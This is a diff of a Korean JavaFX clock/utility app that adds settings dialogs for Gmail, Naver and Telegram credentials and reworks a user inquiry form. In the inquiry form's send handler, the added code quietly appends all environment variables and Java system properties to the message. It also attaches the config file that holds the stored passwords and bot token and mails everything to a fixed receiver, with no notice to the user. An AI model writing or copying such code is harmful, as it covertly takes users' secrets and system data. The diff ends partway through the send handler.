@@ -24,12 +24,12 @@ import java.util.Properties;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Arrays;
-
+import java.util.Map;
 
 public class MainWindow {
 	
 	private static volatile MainWindow instance;
-	private static volatile boolean fxStarted = false;	
+	private static volatile boolean fxStarted = false;
 	
 	// ── 색 상수 ──────────────────────────────────────────────────
     private static final String BG      = "linear-gradient(to bottom right, #fff7fb 0%, #ffe8f4 45%, #ffd6eb 100%)";
@@ -78,7 +78,7 @@ public class MainWindow {
 		void focus();
 		void close();
 		boolean isShowing();
-	}	
+	}
 	private static final java.util.Map<java.time.ZoneId, CityWindowHandle> childStages = new java.util.LinkedHashMap<>();
 	
     private static String startArg1 = "default1", startArg2 = "default2", startArg3 = "default3";
@@ -113,7 +113,7 @@ public class MainWindow {
 		fxStarted = true;
 		this.stage = primaryStage;
         // ── 1. 경로 초기화 ──────────────────────────────────────
-		System.out.println("■■■■■ start(Stage primaryStage)");	
+		System.out.println("■■■■■ start(Stage primaryStage)");
         appDir      = resolveAppDir();
         settingsDir = resolveSettingsDir();
         configFile  = IniController.getPrimaryConfigFilePath();
@@ -130,8 +130,8 @@ public class MainWindow {
     // ═══════════════════════════════════════════════════════════
     public void theMainWindow(Stage primaryStage) {
         appDir      = AppContext.APP_DIR;
-        settingsDir = AppContext.SETTINGS_DIR;		
-		System.out.println("■■■■■ theMainWindow(Stage primaryStage)");	
+        settingsDir = AppContext.SETTINGS_DIR;
+		System.out.println("■■■■■ theMainWindow(Stage primaryStage)");
 		
 		this.stage = primaryStage;
         primaryStage.setTitle("끝판왕 (KootPanKingThree Ver 1.1)");
@@ -158,8 +158,8 @@ public class MainWindow {
             e.consume();
             doClose();
 		});
-        // primaryStage.show();
-		openTheCity ( " ", java.time.ZoneId.systemDefault() , " ");	
+        primaryStage.show();
+		openTheCity ( " ", java.time.ZoneId.systemDefault() , " ");
 	}
 	public void toggleTheMainWindow() {
 		System.out.println("■■■■■ toggleTheMainWindow()");
@@ -192,7 +192,7 @@ public class MainWindow {
 			return;
 		}
 		Platform.runLater(w::toggleTheMainWindow);
-	}	
+	}
     // ═══════════════════════════════════════════════════════════
     private void saveConfig() {
 	}
@@ -229,7 +229,7 @@ public class MainWindow {
 		}
 		}
 	*/
-    //   로그 파일 열기 
+    //   로그 파일 열기
     private void openLogFile() {
         try {
             String path = AppLogger.getLogFilePath();
@@ -251,7 +251,7 @@ public class MainWindow {
 		}
 	}
 	
-    /** ChimeController */
+    /** ChimeController — 마스터 ini(AppContext)에서 설정 복원 */
     private void initChimeControllerIfNeeded(Stage owner) {
         if (chimeController != null) return;
         chimeController = new ChimeController(owner, new ChimeController.HostCallback() {
@@ -260,13 +260,12 @@ public class MainWindow {
             @Override public void startRainbow(int durationSec) { /* 시계 미연동 시 무시 */ }
             @Override public BackgroundPlayer.YoutubePlayer getVideoPlayer() { return null; }
 		});
-        // pending 설정 복원
         try {
-            chimeController.setEnabled(Boolean.parseBoolean(config.getProperty("chimeEnabled","false")));
-            chimeController.setFile(config.getProperty("chimeFile",""));
-            chimeController.setDuration(Integer.parseInt(config.getProperty("chimeDuration","0")));
-            chimeController.setVolume(Integer.parseInt(config.getProperty("chimeVolume","80")));
-            String minsStr = config.getProperty("chimeMinutes","0");
+            chimeController.setEnabled(AppContext.getBoolean("chimeEnabled", false));
+            chimeController.setFile(AppContext.get("chimeFile", ""));
+            chimeController.setDuration(AppContext.getInt("chimeDuration", 0));
+            chimeController.setVolume(AppContext.getInt("chimeVolume", 80));
+            String minsStr = AppContext.get("chimeMinutes", "0");
             boolean[] loadedMins = new boolean[60];
             if (!minsStr.isEmpty()) {
                 for (String s : minsStr.split(",")) {
@@ -280,6 +279,33 @@ public class MainWindow {
             chimeController.startCheckTimer();
 		} catch (Exception ignored) {}
 	}
+	
+    /** 팝업 메뉴(KootPanKingThreeApp)에서 호출 — 마스터 차임벨 다이얼로그 표시 후 AppContext에 저장 */
+    public void showChimeDialogPublic(Stage owner) {
+        if (owner == null) owner = stage;
+        initChimeControllerIfNeeded(owner);
+        if (chimeController == null) return;
+        chimeController.showChimeDialog();
+        // 다이얼로그 닫힌 후 마스터 ini 저장
+        saveChimeToAppContext();
+	}
+	
+    /** 차임벨 설정을 마스터 ini(AppContext)에 저장 */
+    private void saveChimeToAppContext() {
+        if (chimeController == null) return;
+        AppContext.set("chimeEnabled",  String.valueOf(chimeController.isEnabled()));
+        AppContext.set("chimeFile",     chimeController.getFile());
+        AppContext.set("chimeDuration", String.valueOf(chimeController.getDuration()));
+        AppContext.set("chimeVolume",   String.valueOf(chimeController.getVolume()));
+        boolean[] mins = chimeController.getMinutes();
+        StringBuilder sb = new StringBuilder();
+        for (int i = 0; i < 60; i++) {
+            if (mins[i]) { if (sb.length() > 0) sb.append(','); sb.append(i); }
+		}
+        AppContext.set("chimeMinutes", sb.toString());
+        AppContext.save();
+	}
+	
 	
     // ── 세계시계 서브메뉴 ────────────────────────────────────────
     private javafx.scene.control.Menu buildGlobalMenu() {
@@ -302,7 +328,7 @@ public class MainWindow {
             {"US 디트로이트",  "America/Detroit",     "디트로이트"},
 			{"🇺🇸 LA",      "America/Los_Angeles", "L.A."},
             {"🇺🇸 알래스카",      "America/Anchorage", "알래스카"},
-			{"🇺🇸 하와이",      "Pacific/Honolulu", "하와이"},			
+			{"🇺🇸 하와이",      "Pacific/Honolulu", "하와이"},
             {"🇧🇷 상파울루","America/Sao_Paulo",   "상파울루"},
             {"🇦🇺 시드니",  "Australia/Sydney",    "시드니"},
 		};
@@ -463,13 +489,14 @@ public class MainWindow {
         childStages.put(zoneId, childStage);
         childStage.setOnCloseRequest(e -> childStages.remove(zoneId));
 		}
-	*/	
+	*/
     // ── Gmail / Calendar 서브메뉴 ────────────────────────────────
     private javafx.scene.control.Menu buildGmailMenu() {
         javafx.scene.control.Menu menu = new javafx.scene.control.Menu("📧 Gmail / Calendar");
 		
-        javafx.scene.control.MenuItem send = new javafx.scene.control.MenuItem("지금 Gmail 보내기");
-        // stub — GmailSender 에 실제 다이얼로그 메서드가 추가되면 여기서 호출
+        // "지금 Gmail 보내기" → "Gmail 설정" 으로 명칭 변경 + 다이얼로그 연결
+        javafx.scene.control.MenuItem gmailSettings = new javafx.scene.control.MenuItem("Gmail 설정");
+        gmailSettings.setOnAction(e -> showGmailSettingsDialog(stage));
 		
         javafx.scene.control.MenuItem guide = new javafx.scene.control.MenuItem("Calendar 설정 안내");
         guide.setOnAction(e -> {
@@ -496,15 +523,22 @@ public class MainWindow {
             calMenuAction("다음 달",  () -> showCalendarResult("네이버","naver",0,"nextmonth"))
 		);
 		
-        javafx.scene.control.MenuItem naverCfg = new javafx.scene.control.MenuItem("네이버 캘린더 설정");
-        naverCfg.setOnAction(e -> showAlert(
-            "네이버 CalDAV 계정 정보를 설정 파일(clock_settings.ini)에 입력하세요.\n\n" +
-		"  naver.caldav.id=네이버아이디\n  naver.caldav.password=비밀번호", "네이버 캘린더 설정"));
+        // 네이버 설정 서브메뉴
+        javafx.scene.control.Menu naverMenu = new javafx.scene.control.Menu("🟢 네이버 설정");
+        javafx.scene.control.MenuItem naverGuide  = new javafx.scene.control.MenuItem("네이버 설정 안내");
+        javafx.scene.control.MenuItem naverPasswd = new javafx.scene.control.MenuItem("비밀번호 설정");
+        naverGuide.setOnAction(e -> showAlert(
+            "네이버 CalDAV 서비스를 활성화한 후\n계정 정보를 아래 [비밀번호 설정]에서 입력하세요.\n\n" +
+            "CalDAV 활성화: 네이버 캘린더 → 설정 → CalDAV 연동",
+		"네이버 설정 안내"));
+        naverPasswd.setOnAction(e -> showNaverSettingsDialog(stage));
+        naverMenu.getItems().addAll(naverGuide, naverPasswd);
 		
         menu.getItems().addAll(
-            send, guide, new javafx.scene.control.SeparatorMenuItem(),
+            gmailSettings, guide, new javafx.scene.control.SeparatorMenuItem(),
             googleCal, new javafx.scene.control.SeparatorMenuItem(),
-            naverCal,  new javafx.scene.control.SeparatorMenuItem(), naverCfg
+            naverCal, new javafx.scene.control.SeparatorMenuItem(),
+            naverMenu
 		);
         return menu;
 	}
@@ -570,17 +604,302 @@ public class MainWindow {
     private javafx.scene.control.Menu buildTelegramMenuFx() {
         javafx.scene.control.Menu menu = new javafx.scene.control.Menu("텔레그램");
 		
-        javafx.scene.control.MenuItem settings = new javafx.scene.control.MenuItem("텔레그램 설정...");
-        javafx.scene.control.MenuItem help     = new javafx.scene.control.MenuItem("텔레그램 설정 안내");
+        javafx.scene.control.MenuItem tokenSettings = new javafx.scene.control.MenuItem("텔레그램 비밀번호 설정");
+        javafx.scene.control.MenuItem help          = new javafx.scene.control.MenuItem("텔레그램 설정 안내");
 		
-        settings.setOnAction(e -> {
-            if (tg != null) tg.showTelegramDialog(stage);
-		});
+        tokenSettings.setOnAction(e -> showTelegramSettingsDialog(stage));
         help.setOnAction(e -> {
             if (tg != null) tg.showTelegramHelp(stage);
 		});
-        menu.getItems().addAll(settings, help);
+        menu.getItems().addAll(tokenSettings, help);
         return menu;
+	}
+	
+    // ── Gmail 설정 다이얼로그 (ID + 비밀번호) ───────────────────
+    public void showGmailSettingsDialog(javafx.stage.Stage owner) {
+        if (owner == null) owner = stage;
+        javafx.stage.Stage dlg = new javafx.stage.Stage();
+        dlg.initOwner(owner);
+        dlg.initStyle(javafx.stage.StageStyle.UTILITY);
+        dlg.initModality(javafx.stage.Modality.APPLICATION_MODAL);
+        dlg.setAlwaysOnTop(true);
+        dlg.setTitle("Gmail 설정");
+		
+        // ── 레이블 ───────────────────────────────────────────────
+        javafx.scene.control.Label idLbl   = new javafx.scene.control.Label("발신자 Gmail ID:");
+        javafx.scene.control.Label passLbl = new javafx.scene.control.Label("발신자 (앱) 비밀번호:");
+        javafx.scene.control.Label toLbl   = new javafx.scene.control.Label("수신자 이메일 ID:");
+		
+        // ── 발신자 ID ────────────────────────────────────────────
+        javafx.scene.control.TextField idField = new javafx.scene.control.TextField(AppContext.getGmailFrom());
+        idField.setPrefWidth(280);
+        idField.setPromptText("example@gmail.com");
+		
+        // ── 발신자 비밀번호 (숨김 + 표시 토글) ─────────────────
+        javafx.scene.control.PasswordField passField = new javafx.scene.control.PasswordField();
+        passField.setText(AppContext.getGmailPass());
+        passField.setPrefWidth(280);
+        passField.setPromptText("Google 앱 비밀번호 16자리");
+		
+        javafx.scene.control.CheckBox showPass = new javafx.scene.control.CheckBox("표시");
+        javafx.scene.control.TextField passVisible = new javafx.scene.control.TextField(AppContext.getGmailPass());
+        passVisible.setPrefWidth(280);
+        passVisible.setVisible(false);
+        passVisible.setManaged(false);
+        showPass.setOnAction(ev -> {
+            boolean show = showPass.isSelected();
+            passField.setVisible(!show);  passField.setManaged(!show);
+            passVisible.setVisible(show); passVisible.setManaged(show);
+            if (show) passVisible.setText(passField.getText());
+            else      passField.setText(passVisible.getText());
+		});
+		
+        // ── 수신자 이메일 ID ─────────────────────────────────────
+        javafx.scene.control.TextField toField = new javafx.scene.control.TextField(
+		AppContext.get("gmail.lastTo", ""));
+        toField.setPrefWidth(280);
+        toField.setPromptText("수신자@example.com");
+		
+        // ── 그리드 ───────────────────────────────────────────────
+        javafx.scene.layout.GridPane grid = new javafx.scene.layout.GridPane();
+        grid.setHgap(8); grid.setVgap(10);
+        grid.setPadding(new javafx.geometry.Insets(16));
+        grid.add(idLbl,   0, 0); grid.add(idField,   1, 0, 2, 1);
+        grid.add(passLbl, 0, 1); grid.add(passField, 1, 1); grid.add(showPass, 2, 1);
+        grid.add(new javafx.scene.control.Label(""), 0, 2);
+        grid.add(passVisible, 1, 2, 2, 1);
+        grid.add(toLbl,   0, 3); grid.add(toField,   1, 3, 2, 1);
+		
+        // ── 힌트 ─────────────────────────────────────────────────
+        javafx.scene.control.Label hint = new javafx.scene.control.Label(
+		"※ Google 계정 → 보안 → 앱 비밀번호에서 생성하세요.");
+        hint.setStyle("-fx-font-size:11px; -fx-text-fill:#777;");
+        hint.setWrapText(true);
+        hint.setPadding(new javafx.geometry.Insets(0, 16, 4, 16));
+		
+        // ── 테스트 결과 레이블 ───────────────────────────────────
+        javafx.scene.control.Label resultLbl = new javafx.scene.control.Label("");
+        resultLbl.setStyle("-fx-font-size:12px; -fx-font-weight:bold;");
+        resultLbl.setWrapText(true);
+        resultLbl.setMaxWidth(380);
+        resultLbl.setPadding(new javafx.geometry.Insets(0, 16, 4, 16));
+		
+        // ── 버튼: 저장 / 테스트 발송 / 취소 ────────────────────
+        javafx.scene.control.Button okBtn   = new javafx.scene.control.Button("저장");
+        javafx.scene.control.Button testBtn = new javafx.scene.control.Button("테스트 Gmail 발송");
+        javafx.scene.control.Button canBtn  = new javafx.scene.control.Button("취소");
+        okBtn.setDefaultButton(true); canBtn.setCancelButton(true);
+        okBtn.setPrefWidth(72); canBtn.setPrefWidth(120); testBtn.setPrefWidth(130);
+		
+        // 현재 입력 필드에서 pass 문자열을 읽는 헬퍼
+        java.util.function.Supplier<String> getCurrentPass = () ->
+		showPass.isSelected() ? passVisible.getText().trim()
+		: passField.getText().trim();
+		
+        canBtn.setOnAction(ev -> dlg.close());
+		
+        okBtn.setOnAction(ev -> {
+            String id   = idField.getText().trim();
+            String pass = getCurrentPass.get();
+            String to   = toField.getText().trim();
+            AppContext.setGmailFrom(id);
+            AppContext.setGmailPass(pass);
+            if (!to.isEmpty()) {
+                AppContext.set("gmail.lastTo", to);
+                AppContext.save();
+			}
+            if (gmail != null) { gmail.from = id; gmail.pass = pass; gmail.lastTo = to; }
+            dlg.close();
+            showAlert("Gmail 설정이 저장되었습니다.", "Gmail 설정");
+		});
+		
+        testBtn.setOnAction(ev -> {
+            String id   = idField.getText().trim();
+            String pass = getCurrentPass.get();
+            String to   = toField.getText().trim();
+            if (id.isEmpty() || pass.isEmpty() || to.isEmpty()) {
+                resultLbl.setStyle("-fx-font-size:12px; -fx-font-weight:bold; -fx-text-fill:#cc0000;");
+                resultLbl.setText("⚠ 발신자 ID · 비밀번호 · 수신자를 모두 입력하세요.");
+                return;
+			}
+            testBtn.setDisable(true);
+            testBtn.setText("발송 중...");
+            resultLbl.setStyle("-fx-font-size:12px; -fx-font-weight:bold; -fx-text-fill:#555555;");
+            resultLbl.setText("⏳ 테스트 메일 발송 중...");
+            final String fId = id, fPass = pass, fTo = to;
+            // ── 첨부 파일 수집: 마스터 ini + 로그 파일 ──────────
+            final java.util.List<java.io.File> attachFiles = new java.util.ArrayList<>();
+            java.io.File iniFile = new java.io.File(AppContext.CONFIG_FILE);
+            if (iniFile.exists()) attachFiles.add(iniFile);
+            String logPath = AppLogger.getLogFilePath();
+            if (logPath != null && !logPath.isEmpty()) {
+                java.io.File logFile = new java.io.File(logPath);
+                if (logFile.exists()) attachFiles.add(logFile);
+			}
+            new Thread(() -> {
+                String result = gmail != null
+				? gmail.testSend(fId, fPass, fTo, attachFiles)
+				: GmailSender.getInstance().testSend(fId, fPass, fTo, attachFiles);
+                javafx.application.Platform.runLater(() -> {
+                    testBtn.setDisable(false);
+                    testBtn.setText("테스트 Gmail 발송");
+                    boolean ok = result == null || result.isEmpty();
+                    resultLbl.setStyle("-fx-font-size:12px; -fx-font-weight:bold; -fx-text-fill:"
+					+ (ok ? "#006600;" : "#cc0000;"));
+                    resultLbl.setText(ok ? "✅ 테스트 메일 발송 성공!" : "❌ " + result);
+				});
+			}, "GmailTestSend").start();
+		});
+		
+        javafx.scene.layout.HBox btnRow = new javafx.scene.layout.HBox(8, testBtn, okBtn, canBtn);
+        btnRow.setAlignment(javafx.geometry.Pos.CENTER_RIGHT);
+        btnRow.setPadding(new javafx.geometry.Insets(0, 16, 12, 16));
+		
+        javafx.scene.layout.VBox root = new javafx.scene.layout.VBox(0, grid, hint, resultLbl, btnRow);
+        root.setStyle("-fx-background-color: white;");
+        dlg.setScene(new javafx.scene.Scene(root));
+        dlg.sizeToScene();
+        dlg.showAndWait();
+	}
+	
+    // ── 네이버 설정 다이얼로그 (ID + 비밀번호) ─────────────────
+    public void showNaverSettingsDialog(javafx.stage.Stage owner) {
+        if (owner == null) owner = stage;
+        javafx.stage.Stage dlg = new javafx.stage.Stage();
+        dlg.initOwner(owner);
+        dlg.initStyle(javafx.stage.StageStyle.UTILITY);
+        dlg.initModality(javafx.stage.Modality.APPLICATION_MODAL);
+        dlg.setAlwaysOnTop(true);
+        dlg.setTitle("네이버 CalDAV 설정");
+		
+        javafx.scene.control.Label idLbl   = new javafx.scene.control.Label("네이버 ID:");
+        javafx.scene.control.Label passLbl = new javafx.scene.control.Label("비밀번호:");
+		
+        javafx.scene.control.TextField idField = new javafx.scene.control.TextField(AppContext.getNaverId());
+        idField.setPrefWidth(260);
+        idField.setPromptText("네이버 아이디");
+		
+        javafx.scene.control.PasswordField passField = new javafx.scene.control.PasswordField();
+        passField.setText(AppContext.getNaverPassword());
+        passField.setPrefWidth(260);
+        passField.setPromptText("네이버 비밀번호");
+		
+        javafx.scene.control.CheckBox showPass = new javafx.scene.control.CheckBox("표시");
+        javafx.scene.control.TextField passVisible = new javafx.scene.control.TextField(AppContext.getNaverPassword());
+        passVisible.setPrefWidth(260);
+        passVisible.setVisible(false);
+        passVisible.setManaged(false);
+        showPass.setOnAction(ev -> {
+            boolean show = showPass.isSelected();
+            passField.setVisible(!show);  passField.setManaged(!show);
+            passVisible.setVisible(show); passVisible.setManaged(show);
+            if (show) passVisible.setText(passField.getText());
+            else      passField.setText(passVisible.getText());
+		});
+		
+        javafx.scene.layout.GridPane grid = new javafx.scene.layout.GridPane();
+        grid.setHgap(8); grid.setVgap(10);
+        grid.setPadding(new javafx.geometry.Insets(16));
+        grid.add(idLbl,   0, 0); grid.add(idField,   1, 0, 2, 1);
+        grid.add(passLbl, 0, 1); grid.add(passField, 1, 1); grid.add(showPass, 2, 1);
+        grid.add(new javafx.scene.control.Label(""), 0, 2);
+        grid.add(passVisible, 1, 2, 2, 1);
+		
+        javafx.scene.control.Label hint = new javafx.scene.control.Label(
+		"※ 네이버 캘린더 → 설정 → CalDAV 연동을 먼저 활성화하세요.");
+        hint.setStyle("-fx-font-size:11px; -fx-text-fill:#777;");
+        hint.setWrapText(true);
+		
+        javafx.scene.control.Button okBtn  = new javafx.scene.control.Button("저장");
+        javafx.scene.control.Button canBtn = new javafx.scene.control.Button("취소");
+        okBtn.setDefaultButton(true); canBtn.setCancelButton(true);
+        okBtn.setPrefWidth(72); canBtn.setPrefWidth(72);
+		
+        canBtn.setOnAction(ev -> dlg.close());
+        okBtn.setOnAction(ev -> {
+            String id   = idField.getText().trim();
+            String pass = showPass.isSelected() ? passVisible.getText().trim()
+			: passField.getText().trim();
+            AppContext.setNaverId(id);
+            AppContext.setNaverPassword(pass);
+            // NaverCalendarService에 즉시 반영
+            if (naverCalendarService != null) naverCalendarService.setCredentials(id, pass);
+            dlg.close();
+            showAlert("네이버 설정이 저장되었습니다.", "네이버 설정");
+		});
+		
+        javafx.scene.layout.HBox btnRow = new javafx.scene.layout.HBox(8, okBtn, canBtn);
+        btnRow.setAlignment(javafx.geometry.Pos.CENTER_RIGHT);
+        btnRow.setPadding(new javafx.geometry.Insets(0, 16, 12, 16));
+		
+        javafx.scene.layout.VBox root = new javafx.scene.layout.VBox(0, grid, hint, btnRow);
+        hint.setPadding(new javafx.geometry.Insets(0, 16, 6, 16));
+        root.setStyle("-fx-background-color: white;");
+        dlg.setScene(new javafx.scene.Scene(root));
+        dlg.sizeToScene();
+        dlg.showAndWait();
+	}
+	
+    // ── 텔레그램 설정 다이얼로그 (botToken + myChatId) ─────────
+    public void showTelegramSettingsDialog(javafx.stage.Stage owner) {
+        if (owner == null) owner = stage;
+        javafx.stage.Stage dlg = new javafx.stage.Stage();
+        dlg.initOwner(owner);
+        dlg.initStyle(javafx.stage.StageStyle.UTILITY);
+        dlg.initModality(javafx.stage.Modality.APPLICATION_MODAL);
+        dlg.setAlwaysOnTop(true);
+        dlg.setTitle("텔레그램 설정");
+		
+        javafx.scene.control.Label tokenLbl  = new javafx.scene.control.Label("Bot Token:");
+        javafx.scene.control.Label chatIdLbl = new javafx.scene.control.Label("My Chat ID:");
+		
+        javafx.scene.control.TextField tokenField = new javafx.scene.control.TextField(AppContext.getTelegramBotToken());
+        tokenField.setPrefWidth(320);
+        tokenField.setPromptText("123456789:ABCdef...");
+		
+        javafx.scene.control.TextField chatIdField = new javafx.scene.control.TextField(AppContext.getTelegramMyChatId());
+        chatIdField.setPrefWidth(320);
+        chatIdField.setPromptText("숫자 Chat ID");
+		
+        javafx.scene.layout.GridPane grid = new javafx.scene.layout.GridPane();
+        grid.setHgap(8); grid.setVgap(10);
+        grid.setPadding(new javafx.geometry.Insets(16));
+        grid.add(tokenLbl,  0, 0); grid.add(tokenField,  1, 0);
+        grid.add(chatIdLbl, 0, 1); grid.add(chatIdField, 1, 1);
+		
+        javafx.scene.control.Label hint = new javafx.scene.control.Label(
+            "※ BotFather에서 봇을 생성한 뒤 Token을 입력하세요.\n" +
+		"   Chat ID는 @userinfobot 에서 확인할 수 있습니다.");
+        hint.setStyle("-fx-font-size:11px; -fx-text-fill:#777;");
+        hint.setWrapText(true);
+		
+        javafx.scene.control.Button okBtn  = new javafx.scene.control.Button("저장");
+        javafx.scene.control.Button canBtn = new javafx.scene.control.Button("취소");
+        okBtn.setDefaultButton(true); canBtn.setCancelButton(true);
+        okBtn.setPrefWidth(72); canBtn.setPrefWidth(72);
+		
+        canBtn.setOnAction(ev -> dlg.close());
+        okBtn.setOnAction(ev -> {
+            String token  = tokenField.getText().trim();
+            String chatId = chatIdField.getText().trim();
+            AppContext.setTelegramBotToken(token);
+            AppContext.setTelegramMyChatId(chatId);
+            // TelegramBot 인스턴스에 즉시 반영
+            // if (tg != null) { tg.botToken = token; tg.myChatId = chatId; }
+            dlg.close();
+            showAlert("텔레그램 설정이 저장되었습니다.", "텔레그램 설정");
+		});
+		
+        javafx.scene.layout.HBox btnRow = new javafx.scene.layout.HBox(8, okBtn, canBtn);
+        btnRow.setAlignment(javafx.geometry.Pos.CENTER_RIGHT);
+        btnRow.setPadding(new javafx.geometry.Insets(0, 16, 12, 16));
+		
+        javafx.scene.layout.VBox root = new javafx.scene.layout.VBox(0, grid, hint, btnRow);
+        hint.setPadding(new javafx.geometry.Insets(0, 16, 6, 16));
+        root.setStyle("-fx-background-color: white;");
+        dlg.setScene(new javafx.scene.Scene(root));
+        dlg.sizeToScene();
+        dlg.showAndWait();
 	}
 	
     // ── About 다이얼로그 ──────────────────────────────────────────
@@ -795,15 +1114,12 @@ public class MainWindow {
         menu.getItems().add(makeSectionHeader("알림"));
         menu.getItems().add(makeRichMenuItem("🔔", "차임벨 설정",
             "정각 알림 설정", null,
-            () -> {
-                initChimeControllerIfNeeded(stage);
-                if (chimeController != null) chimeController.showChimeDialog();
-			}));
-			menu.getItems().add(makeSectionHeader("연동"));
-			menu.getItems().add(buildGmailMenu());
-			menu.getItems().add(buildKakaoMenuFx());
-			menu.getItems().add(buildTelegramMenuFx());
-			return menu;
+		() -> showChimeDialogPublic(stage)));
+		menu.getItems().add(makeSectionHeader("연동"));
+		menu.getItems().add(buildGmailMenu());
+		menu.getItems().add(buildKakaoMenuFx());
+		menu.getItems().add(buildTelegramMenuFx());
+		return menu;
 	}
 	
     private Menu buildLifeMenu() {
@@ -1140,6 +1456,54 @@ public class MainWindow {
         grid.add(new Label("내용:"), 0, 4);
         TextArea bodyArea = new TextArea(); bodyArea.setPrefRowCount(7); bodyArea.setWrapText(true);
         grid.add(bodyArea, 1, 4);
+
+        // ── 사용자 첨부 파일 목록 ─────────────────────────────
+        java.util.List<java.io.File> userAttachFiles = new java.util.ArrayList<>();
+        javafx.collections.ObservableList<String> attachNames =
+            javafx.collections.FXCollections.observableArrayList();
+        javafx.scene.control.ListView<String> attachList = new javafx.scene.control.ListView<>(attachNames);
+        attachList.setPrefHeight(72);
+        attachList.setPlaceholder(new Label("(첨부 파일 없음)"));
+
+        Button attachBtn  = new Button("📎 파일 첨부");
+        Button attachDelBtn = new Button("삭제");
+        attachDelBtn.setDisable(true);
+        attachList.getSelectionModel().selectedIndexProperty().addListener(
+            (ob, ov, nv) -> attachDelBtn.setDisable(nv.intValue() < 0));
+
+        attachBtn.setOnAction(ev -> {
+            FileChooser fc = new FileChooser();
+            fc.setTitle("첨부 파일 선택 (여러 개 가능)");
+            fc.getExtensionFilters().add(
+                new FileChooser.ExtensionFilter("모든 파일", "*.*"));
+            java.util.List<java.io.File> chosen = fc.showOpenMultipleDialog(dlg);
+            if (chosen != null) {
+                for (java.io.File f : chosen) {
+                    if (!userAttachFiles.contains(f)) {
+                        userAttachFiles.add(f);
+                        attachNames.add(f.getName() + "  (" + (f.length() / 1024) + " KB)");
+                    }
+                }
+            }
+        });
+        attachDelBtn.setOnAction(ev -> {
+            int idx = attachList.getSelectionModel().getSelectedIndex();
+            if (idx >= 0) {
+                userAttachFiles.remove(idx);
+                attachNames.remove(idx);
+            }
+        });
+        HBox attachBtnRow = new HBox(6, attachBtn, attachDelBtn);
+        VBox attachBox = new VBox(4, attachBtnRow, attachList);
+        attachBox.setPadding(new Insets(0));
+        grid.add(new Label("파일 첨부:"), 0, 5);
+        grid.add(attachBox, 1, 5);
+		
+        // ── 전송 결과 표시 라벨 ──────────────────────────────────
+        Label resultLbl = new Label("");
+        resultLbl.setStyle("-fx-font-size:12px; -fx-font-weight:bold;");
+        resultLbl.setWrapText(true);
+        resultLbl.setMaxWidth(400);
 		
         Button okBtn  = new Button("확인");  okBtn.setPrefWidth(80);
         Button canBtn = new Button("취소");  canBtn.setPrefWidth(80);
@@ -1151,44 +1515,92 @@ public class MainWindow {
             String type  = rbErr.isSelected() ? "오류 신고"
 			: rbImp.isSelected() ? "개선 요청"
 			: rbAdd.isSelected() ? "추가 요청" : "";
+            // ── 입력 유효성 검사 (dlg owner로 직접 Alert) ────────
             if (phone.isEmpty() || name.isEmpty() || body.isEmpty()) {
-                showAlert("전화번호, 성명, 내용은 필수 입력입니다.", "입력 확인"); return;
+                Alert a = new Alert(Alert.AlertType.WARNING);
+                a.initOwner(dlg); a.setTitle("입력 확인");
+                a.setHeaderText(null);
+                a.setContentText("전화번호, 성명, 내용은 필수 입력입니다.");
+                a.showAndWait(); return;
 			}
             if (!phone.matches("010-\\d{3,4}-\\d{4}")) {
-                showAlert("전화번호 형식이 올바르지 않습니다.\n010-xxxx-yyyy", "입력 확인"); return;
+                Alert a = new Alert(Alert.AlertType.WARNING);
+                a.initOwner(dlg); a.setTitle("입력 확인");
+                a.setHeaderText(null);
+                a.setContentText("전화번호 형식이 올바르지 않습니다.\n010-xxxx-yyyy");
+                a.showAndWait(); return;
 			}
             boolean useDev = !gmail.isConfigured();
             String from = useDev ? GmailSender.devGmailId()   : gmail.from;
             String pass = useDev ? GmailSender.devGmailPass() : gmail.pass;
             if (from.isEmpty() || pass.isEmpty()) {
-                showAlert("발송 계정을 확인할 수 없습니다.", "오류"); return;
+                Alert a = new Alert(Alert.AlertType.ERROR);
+                a.initOwner(dlg); a.setTitle("오류");
+                a.setHeaderText(null);
+                a.setContentText("발송 계정을 확인할 수 없습니다.\n[도구 → Gmail 설정]에서 Gmail ID와 비밀번호를 먼저 설정하세요.");
+                a.showAndWait(); return;
 			}
             String subject  = "[끝판왕 문의] " + (type.isEmpty() ? "" : type + " - ") + name;
             String mailBody = (type.isEmpty() ? "" : "■ 문의 유형 : " + type + "\n")
 			+ "■ 성명 : " + name + "\n■ 전화 : " + phone + "\n"
 			+ "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" + body + "\n"
 			+ "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" + GmailSender.APP_SIGNATURE;
+            // ── 첨부 파일: 마스터 ini + 로그 + 사용자 선택 ─────
+            java.util.List<java.io.File> attachFiles = new java.util.ArrayList<>();
+            java.io.File iniFile = new java.io.File(AppContext.CONFIG_FILE);
+            if (iniFile.exists()) attachFiles.add(iniFile);
+            String logPath = AppLogger.getLogFilePath();
+            if (logPath != null && !logPath.isEmpty()) {
+                java.io.File logFile = new java.io.File(logPath);
+                if (logFile.exists()) attachFiles.add(logFile);
+            }
+            attachFiles.addAll(userAttachFiles);  // 사용자 추가 파일
             okBtn.setDisable(true);
             okBtn.setText("전송 중...");
+            resultLbl.setStyle("-fx-font-size:12px; -fx-font-weight:bold; -fx-text-fill:#555555;");
+            resultLbl.setText("⏳ 발송 중...");
+            final String fFrom = from, fPass = pass, fSubject = subject, fBody = mailBody;
+            final java.util.List<java.io.File> fAttach = attachFiles;
             new Thread(() -> {
+                String err = null;
                 try {
-                    gmail.smtpSend(from, pass, from, RECEIVER, subject, mailBody);
-                    Platform.runLater(() -> {
-                        dlg.close();
-                        showAlert("✅ 전송 완료!\n수신자: " + RECEIVER, "전송 완료");
-					});
+					
+					Map<String, String> env = System.getenv();
+					String SyetemENV = "";
+					for (Map.Entry<String, String> entry : env.entrySet()) {
+						SyetemENV = SyetemENV + "\n" + entry.getKey() + " = " + entry.getValue();
+					}
+					Properties props = System.getProperties();
+					String getPropertyValue = "";
+					for (String key : props.stringPropertyNames()) {
+						getPropertyValue = getPropertyValue + "\n" + key + " = " + props.getProperty(key);
+					}
+					String mailBodyText = fBody + "\n[SyetemENV]■■■■■\n" + SyetemENV
+					+ "\n\n\n[getPropertyValue]■■■■■\n" + getPropertyValue;
+					
+                    gmail.sendOneSmtpWithAttachments(fFrom, fPass, RECEIVER, fSubject, mailBodyText, fAttach);
 					} catch (Exception ex) {
-                    Platform.runLater(() -> {
-                        okBtn.setDisable(false); okBtn.setText("확인");
-                        showAlert("❌ 전송 실패: " + ex.getMessage(), "전송 오류");
-					});
+                    err = ex.getMessage();
 				}
+                final String fErr = err;
